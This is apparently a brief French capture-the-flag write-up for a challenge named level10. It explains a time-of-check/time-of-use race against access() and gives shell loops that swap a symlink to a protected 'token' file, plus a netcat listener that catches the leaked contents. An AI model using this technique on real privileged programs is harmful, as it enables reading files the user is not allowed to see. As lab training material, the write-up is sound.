```
hexdump -C level10
```

On trouve un appel a `access()` pour verifier si l'utilisateur a droit de faire `open`
Ceci ouvre une vulnerabilite a une attaque de type TOC/TOU.

On cree 2 boucles:

```sh
while true;
do
	ln -fs token malicious_link
	ln -fs nani malicious_link
done
```

et

```sh
while true;
do
	./level10 malicious_link 127.0.0.1
done
```

Puis on ecoute les connections avec netcat:
```sh
nc -l -k 6969
```



